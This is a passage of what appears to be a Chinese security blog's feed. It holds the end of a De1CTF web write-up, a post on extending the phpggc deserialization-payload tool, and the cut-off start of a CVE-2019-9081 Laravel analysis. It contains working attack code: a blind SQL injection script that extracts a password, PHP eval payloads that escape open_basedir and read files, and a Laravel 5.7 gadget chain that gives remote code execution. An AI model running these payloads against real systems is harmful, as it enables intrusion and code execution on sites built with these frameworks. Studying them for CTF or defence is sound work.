class="keyword">print</span> r</span><br><span class="line">seed_list = [<span class="string">'8674e9e3b1f875549154d6e67275f996'</span>,<span class="string">'df6dfa987283ffb730857170b5d43128'</span>,<span class="string">'541c571155c89cd4e183b4b17cb15f58'</span>,<span class="string">'6ec428a2d4228ef2378d38e0902cb8ab'</span>,<span class="string">'e1badd072582c8e7aae04c3ee7e77dae'</span>,<span class="string">'539276560804530afc08eb2499e0b865'</span>,<span class="string">'6a2bd9ce496568d210e0a9c0d25b4dfb'</span>,<span class="string">'c18761d54636950afddf19841d7d89b0'</span>,<span class="string">'5e40c2d36b72330faec9ae8cc8728365'</span>,<span class="string">'e5fdd8f158a6953e088abc2915ab211a'</span>,<span class="string">'1d1952993a48af0128eaf6da5f32676b'</span>,<span class="string">'9a189fabc6147d2f894468a657edf5b9'</span>,<span class="string">'d255c575bf2b8d2af0f44f520a09369b'</span>,<span class="string">'0a056867908b10edff7fc312d4798622'</span>,<span class="string">'e537949893013ab3163806171bae5735'</span>,<span class="string">'13f95e9313bfe44e8f80fa42980c1bc3'</span>,<span class="string">'8aad66d7c84981b96d31760027c4ccd1'</span>,<span class="string">'b47097b9846a8c83499d4342de33db31'</span>,<span class="string">'82f720249f5b6c1c9faffc7a5ec93ebc'</span>,<span class="string">'611c45a5ff023134e3034d1fd6de2248'</span>,<span class="string">'04491f0cc963af38fac5752070608a34'</span>,<span class="string">'8de0681a471bfb5868a843fa489864a3'</span>,<span class="string">'83ffca4f8f927a2d4615e677b2b4b44c'</span>,<span class="string">'55d9cbcf35c57ffb7dbc10a91490fe59'</span>,<span class="string">'f38692e68e3628541adb02f4688804d1'</span>,<span class="string">'19baad3d00d52e65f80a8593b4ba255d'</span>,<span class="string">'1e4355a0829c2c740fa71ec49c8fa02a'</span>,<span class="string">'8eb1d6fdc6bf3c774cddc76ab3868fb1'</span>,<span class="string">'0e6d3172d8be061d7a4abf3e167574be'</span>,<span class="string">'c7dc7167891bfa24d8e68fae459b643e'</span>,<span class="string">'7d272df00c853691d3fcac63df650984'</span>,<span class="string">'dcc78a64935d765ccda0813173a2cd16'</span>,<span class="string">'f3ec93c54a6ca1719a467fade49ee233'</span>,<span class="string">'f4974c648bead1faaca6f8fe38dcd3f2'</span>,<span class="string">'519886b669fef5706ff30dd95ca48997'</span>,<span class="string">'3db6f01c8d159dba6356ce0c2e337f30'</span>,<span class="string">'502d5dc2723468c378d721bb1e868191'</span>,<span class="string">'fa1df40a8ac9d237955d3e4c22cb4b45'</span>,<span class="string">'04e0c4e04a675b45fad3ffaddfd9040c'</span>,<span class="string">'efcbd1b16518f2bf91b958af269c030b'</span>,<span class="string">'9409d27de31a6dd2550f8b9e1ae3aba9'</span>,<span class="string">'6743ff069733273efa1cd624e431983e'</span>,<span class="string">'92aa4fe93a448a1677d9782e5f81e62d'</span>,<span class="string">'d309f564f9e116b1a69555d0f9fef3a8'</span>,<span class="string">'1a16f4e59332688eea6e28677d5ac141'</span>,<span class="string">'700cb511e95356b8b2877b79d01ad054'</span>,<span class="string">'b3d8b293864a1621d889daca93bb4812'</span>,<span class="string">'6b7d6adab9ed716b013f8fcc027bf314'</span>,<span class="string">'ad689aa5e736a5b16564534e5b890e1f'</span>,<span class="string">'f53152e6de1c50be961696c529872313'</span>,<span class="string">'38e397ff4154ca8b1574d6f6c15f860e'</span>,<span class="string">'0b800d7e01ee2bfe9cd7c3a113127ca0'</span>,<span class="string">'856500703f201b2b2391ad11a764dc7e'</span>,<span class="string">'88a7336ae95aa16de1c1104fb4f21b8a'</span>,<span class="string">'f6c4c31982540d11a4885689b97cf3a4'</span>,<span class="string">'99db02fc851509e4b32e74837d6016dd'</span>,<span class="string">'bf63960fa6f4a4a08a33f9ce403c4fba'</span>,<span class="string">'5910dd2743cc3b62e9ca4a4f5158b192'</span>,<span class="string">'311b24e5788e747db2e479f7e22b7873'</span>,<span class="string">'8322ab2861f27f19544f095978096f89'</span>,<span class="string">'8bbe576e9e77d23631303ea2a04945e2'</span>,<span class="string">'30c3afeed3110d63a9b9655ad85798a4'</span>,<span class="string">'fab6fb7271b1e19ef47cd106df0df361'</span>,<span class="string">'8fb438550190c9739d0f00e8cfcd9bd3'</span>,<span class="string">'f4160f3b5400f9aeb03ffbcd3223af1b'</span>,<span class="string">'240716ddb36b83dfe6d898ff3bfbe59b'</span>,<span class="string">'8df5da70fa1004206502c60bb00b188d'</span>,<span class="string">'513154bb13bbcd82fae47c9163c834cb'</span>,<span class="string">'248a1a48cc311247505ad4e366c17913'</span>,<span class="string">'57ee7af50ab35086d89ed3812cc4b922'</span>,<span class="string">'56d1ae03f68465af760bebe3293d3f96'</span>,<span class="string">'750d7d5423b613fbc8e9a20cc096a9c2'</span>,<span class="string">'e722b86026e105dc33f568cbf65c8dc2'</span>,<span class="string">'58e951f616b7828781abd35aaf3c2fad'</span>,<span class="string">'6f940887eccffea62552d9d1579c34fe'</span>,<span class="string">'cc615bb9a427a545bfb4c5aa6bb7e873'</span>,<span class="string">'67a38d3d9f9a83300a31078a84e7bc6b'</span>,<span class="string">'abb9c0849d11bd316db61bbef5de2522'</span>,<span class="string">'3730b7a1430756cf80ef2ed80f334a3d'</span>,<span class="string">'8129b4b2bb3cbe6f5cb7f4879267460b'</span>,<span class="string">'f4c1d2ac6dc6369c828a8b2c6e4b8b6e'</span>,<span class="string">'eec7163c18052f4d2844fc8a55200882'</span>,<span class="string">'6715685e28f1da676cb6baa2da283ee5'</span>,<span class="string">'5171458efb3e8fe0b6451d92022985c5'</span>,<span class="string">'066253bcf4518a1ae34b5a6087547b3f'</span>,<span class="string">'bc473690484a0e4095ff4861b865bf5d'</span>,<span class="string">'87d32b90d517565857180baf8f78e67b'</span>,<span class="string">'eab88164ddeffdf69450a1c8f63d2745'</span>,<span class="string">'daa626adb92cc1676f5b361e39f2e300'</span>,<span class="string">'c87a4851696eba43b471792cd7faa13d'</span>,<span class="string">'399200ad28d61daf4b38309ed5f5f4ac'</span>,<span class="string">'b75c53b9d349003f7dc5c04b00231184'</span>,<span class="string">'4d8b7016cd85b5170bc1e2e9ee52ee71'</span>,<span class="string">'8b844fa17339dcccb9ee471078fec5f2'</span>,<span class="string">'91dfa5f1c6da365f7c6238713988c48b'</span>,<span class="string">'1147948d33ade9b9dab90c313a8fd519'</span>,<span class="string">'4363f8a2d8118f65a8e8311296246393'</span>,<span class="string">'48bcc07d28e368d7d8d9798369398312'</span>,<span class="string">'2a205e44d4222bdded0369b0623cad85'</span>,<span class="string">'8101cc7c376b9404ad99c2a2b41d236c'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seed_list:</span><br><span class="line">fuzz_path(i)</span><br></pre></td></tr></table></figure></p><p>爆破一轮后，成功获得path，拿到flag：<br><img src="/images/2019-08-04-15-19-27.png" alt=""></p><h2 id="Giftbox"><a href="#Giftbox" class="headerlink" title="Giftbox"></a>Giftbox</h2><p>题目拿到后，发现会往shell.php发ajax请求，并带有随机数，同时观察命令：<br><img src="/images/2019-08-05-10-08-06.png" alt=""><br>发现有login，于是发现注入，写出脚本注出密码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> ajaxSetting = &#123;</span><br><span class="line">            url: host + <span class="string">`/shell.php?a=login%20<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(username)&#125;</span>%201&amp;validthis=1&amp;totp=<span class="subst">$&#123;<span class="keyword">new</span> TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,<span class="number">8</span>).genOTP()&#125;</span>`</span>,</span><br><span class="line">            type: <span class="string">"GET"</span>,</span><br><span class="line">Type: <span class="string">'json'</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                resolve(response);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                reject(<span class="string">"请求失败"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $.ajax(ajaxSetting);</span><br><span class="line"> </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> ajax(username);</span><br><span class="line">    <span class="keyword">return</span> res.message</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">blind</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0x20</span>; i &lt; <span class="number">0x7f</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//表名 const message = await test(`admin'and(ascii(substr((select\x0agroup_concat(TABLE_NAME)\x0afrom\x0ainformation_schema.TABLES\x0awhere\x0aTABLE_SCHEMA=database()),$&#123;j&#125;,1))=$&#123;i&#125;)#`)</span></span><br><span class="line">            <span class="comment">//列名 const message = await test(`admin'and(ascii(substr((select\x0agroup_concat(COLUMN_NAME)\x0afrom\x0ainformation_schema.COLUMNS\x0awhere\x0aTABLE_NAME=0x7573657273),$&#123;j&#125;,1))=$&#123;i&#125;)#`)</span></span><br><span class="line">            <span class="keyword">const</span> message = <span class="keyword">await</span> test(<span class="string">`admin'and(ascii(substr((select\x0apassword\x0afrom\x0ausers\x0alimit\x0a0,1),<span class="subst">$&#123;j&#125;</span>,1))=<span class="subst">$&#123;i&#125;</span>)#`</span>);</span><br><span class="line">            <span class="keyword">if</span>(message == <span class="string">'login fail, password incorrect.'</span>) &#123;</span><br><span class="line">                ret += <span class="built_in">String</span>.fromCharCode(i);</span><br><span class="line">                <span class="built_in">console</span>.log(ret)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;j&#125;</span>: <span class="subst">$&#123;ret&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-10-23.png" alt=""><br>发现就是eval的sandbox逃逸，而测试发现，过滤了大量的特殊符号，但可利用trick，如下：<br><img src="/images/2019-08-05-10-12-02.png" alt=""><br>同时花括号可以代替中括号：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[sky]  =  $_GET&#123;sky&#125;</span><br></pre></td></tr></table></figure></p><p>那么可以构造出如下exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">targeting a _GET</span><br><span class="line">targeting b sky</span><br><span class="line">targeting c &#123;$&#123;$a&#125;&#123;$b&#125;&#125;</span><br><span class="line">targeting d $&#123;eval($c)&#125;</span><br></pre></td></tr></table></figure></p><p>然后发包的时候带上sky参数即可RCE:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launch(&quot;chdir(&apos;/sandbox&apos;);chdir(&apos;modules&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(ini_get(&apos;open_basedir&apos;));var_dump(glob(&apos;/*&apos;));&quot;)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-05-59.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launch(&quot;chdir(&apos;/sandbox&apos;);chdir(&apos;modules&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(ini_get(&apos;open_basedir&apos;));var_dump(readfile(&apos;/flag&apos;));&quot;)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-06-22.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>De1CTF的Web还是比较简单的，如果有更多解法请留言交流~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;为了去重庆XCTF Final吃火锅，周末就冲了一下De1CTF，以下是本次比赛Web题解。&lt;br&gt;&lt;img src=&quot;/images/20
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>phpggc详解</title>
    <link href="http://skysec.top/2019/08/02/phpggc%E8%AF%A6%E8%A7%A3/"/>
    <id>http://skysec.top/2019/08/02/phpggc详解/</id>
    <published>2019-08-02T01:00:51.000Z</published>
    <updated>2019-08-02T04:06:01.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHPGGC 是一款能够自动生成主流框架的序列化测试payload的工具，类似 Java 中的 ysoserial，支持大量主流框架的序列化exp一键生成。<br>但因为工具作者的时间有限，不能做到实时更新。而本文旨在分析phpggc原理，并为其添加拓展，以便我们加入最新的，自己需要的exp生成模块。</p><h2 id="phpggc流程分析"><a href="#phpggc流程分析" class="headerlink" title="phpggc流程分析"></a>phpggc流程分析</h2><p>当我们运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc Laravel/RCE1 system id</span><br></pre></td></tr></table></figure></p><p>我们跟踪一下具体流程。</p><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><p><img src="/images/2019-08-02-09-01-27.png" alt=""><br>在创建对象时，我们下断点，发现首先程序会进行load_gadget_chains():<br><img src="/images/2019-08-02-09-07-02.png" alt=""><br>紧接着程序会寻找定义申明过的class:<br><img src="/images/2019-08-02-09-10-20.png" alt=""><br><img src="/images/2019-08-02-09-11-29.png" alt=""><br>经过array_filter，将程序自己构造的gadget取出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$classes = array_filter($classes, <span class="function"><span class="keyword">function</span><span class="params">($class)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_subclass_of($class, <span class="string">'\\PHPGGC\\GadgetChain'</span>) &amp;&amp;</span><br><span class="line">                   strpos($class, <span class="string">'GadgetChain\\'</span>) === <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-14-33.png" alt=""><br>然后是取出模块名：<br><img src="/images/2019-08-02-09-15-49.png" alt=""><br>我们跟进get_name()，就可以发现，例如：<code>GadgetChain\ZendFramework\FD1</code>经过处理会变成<code>ZendFramework/FD1</code>:<br><img src="/images/2019-08-02-09-17-48.png" alt=""><br>然后将模块名与类申明形成映射关系：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcs = array_combine($names, $classes);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-19-59.png" alt=""><br>至此为止，初始化过程完成。</p><h3 id="exp生成"><a href="#exp生成" class="headerlink" title="exp生成"></a>exp生成</h3><p>然后初始化完成后，我们成功创建了PHPGGC对象x，然后调用其generate方法进行exp生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x-&gt;generate();</span><br></pre></td></tr></table></figure></p><p>首先是从我们的cmdline获取脚本运行参数，并将其解析：<br><img src="/images/2019-08-02-09-21-47.png" alt=""><br>例如我们此时解析出的参数：<br><img src="/images/2019-08-02-09-22-25.png" alt=""><br>同时如果发现我们没有input参数，就会友好性的打出help界面。<br>然后代码就会来到gadget chain的获取：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gc = <span class="keyword">$this</span>-&gt;get_gadget_chain($class);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-24-44.png" alt=""><br>这里就用到了之前的模块名和类名的映射关系，通过我们传入的模块名迅速找到已申明的类。<br>然后在需要时，再将其包含进来：<br><img src="/images/2019-08-02-09-25-57.png" alt=""><br>我们跟进该函数：<br><img src="/images/2019-08-02-09-26-19.png" alt=""><br>根据命名规则，程序会在其目录gadgetchains下寻找对应文件夹，例如我们对应的目录为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpggc/gadgetchains/Laravel/RCE/1</span><br></pre></td></tr></table></figure></p><p>然后获取其目录下的gadgets.php，拿到对应的类的定义。<br>然后就是利用我们定义的chain.php构造序列化了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$parameters = <span class="keyword">$this</span>-&gt;get_type_parameters($gc, $parameters);</span><br><span class="line">$generated = <span class="keyword">$this</span>-&gt;serialize($gc, $parameters);</span><br></pre></td></tr></table></figure></p><p>首先程序会拿出我们传进去的参数，然后在chain.php中生成序列化的时候使用：<br><img src="/images/2019-08-02-09-35-30.png" alt=""><br>我们关注一下chain.php：<br><img src="/images/2019-08-02-09-35-57.png" alt=""><br>例如我们使用的Laravel/RCE1的chain.php，其中的函数名和参数名都是靠我们传入的。<br>这样便能达成生成指定命令执行的序列化构造的目的。<br><img src="/images/2019-08-02-09-37-30.png" alt=""><br>最后程序会将我们的结果输出。</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>因为phpggc具有很好的拓展性，我们可以将现有已知的exp集成加入，这里就以之前很火的Laravel反序列化RCE为例：<br>phpggc本身提供了新建命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc --new Laravel RCE</span><br></pre></td></tr></table></figure></p><p>运行后phpggc会按规则自动生成如下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpggc/gadgetchains/Laravel/RCE/5</span><br></pre></td></tr></table></figure></p><p>我们按照规则构造gadgets.php和chain.php：<br>gadgets.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line"><span class="keyword">protected</span> $parameters;</span><br><span class="line"><span class="keyword">protected</span> $app;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line"><span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>chain.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Laravel</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE5</span> <span class="keyword">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">RCE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $version = <span class="string">'5.7'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'sky'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    $function = $parameters[<span class="string">'function'</span>];</span><br><span class="line">        $parameter = $parameters[<span class="string">'parameter'</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> \Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">$function,</span><br><span class="line"><span class="keyword">array</span>($parameter),</span><br><span class="line"><span class="keyword">new</span> \Illuminate\Auth\GenericUser(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>))</span><br><span class="line">),</span><br><span class="line"><span class="keyword">new</span> \Illuminate\Foundation\Application(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>))</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们运行起来，可以看到在模块和类的映射关系中，已经有了我们的RCE5：<br><img src="/images/2019-08-02-09-47-01.png" alt=""><br>运行一下，即可直接拿到exp：<br><img src="/images/2019-08-02-11-30-03.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>phpggc提供非常好的可拓展性，我们可以按此将其打造成自己专属的武器库，实战遇到再也不怕手忙脚乱啦！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;PHPGGC 是一款能够自动生成主流框架的序列化测试payload的工具，类似 Java 中的 ysoserial，支持大量主流框架的序列化
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-9081:Laravel Deserialization RCE Vulnerability</title>
    <link href="http://skysec.top/2019/07/22/CVE-2019-9081-Laravel-Deserialization-RCE-Vulnerability/"/>
    <id>http://skysec.top/2019/07/22/CVE-2019-9081-Laravel-Deserialization-RCE-Vulnerability/</id>
    <published>2019-07-22T13:47:39.000Z</published>
    <updated>2019-07-22T13:50:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="laravel序列化"><a href="#laravel序列化" class="headerlink" title="laravel序列化"></a>laravel序列化</h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)，若其本身出现漏洞，则对使用响应框架开发的网站影响是致命的。而这里就将分析laravel框架序列化RCE，CVE编号：CVE-2019-9081，受影响范围：laravel &gt;= 5.7。</p><h2 id="类名加载"><a href="#类名加载" class="headerlink" title="类名加载"></a>类名加载</h2><p>我们首先随便构造一段序列化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $sky=<span class="string">'test'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sky = <span class="keyword">new</span> sky();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sky));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 